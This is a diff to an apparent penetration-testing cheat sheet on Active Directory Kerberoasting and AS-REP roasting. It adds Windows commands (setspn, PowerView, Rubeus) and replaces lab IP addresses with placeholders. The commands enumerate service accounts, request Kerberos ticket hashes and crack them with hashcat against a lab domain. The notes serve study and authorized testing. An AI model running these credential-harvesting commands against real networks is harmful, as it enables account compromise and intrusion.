@@ -5,27 +5,38 @@
 ```sh
 impacket-GetUserSPNs domain/username:'password' -dc-ip $target
 ```
+### Windows only check
 
+```sh
+setspn -T <domain> -Q */*
+```
+#### PowerView
+
+```sh
+Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon
+```
 ## Request
 
 ```sh
 impacket-GetUserSPNs domain/username:'password' -dc-ip $target -request
 ```
+### Windows only request
 
+```sh
+./Rubeus.exe kerberoast /outfile:hashes.txt
+```
 ## Crack it
 
 ```sh
 hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 ```
-
 # AS-REP Roasting
 
 ```sh
-impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.10.14.57 -format hashcat -outputfile asrep_hashes.txt
+impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep_hashes.txt
 
-impacket-GetNPUsers INLANEFREIGHT.LOCAL/mholliday -request -dc-ip 172.16.5.5
+impacket-GetNPUsers INLANEFREIGHT.LOCAL/mholliday -request -dc-ip <DC_IP>
 ```
-
 ## Crack
 
 ```sh
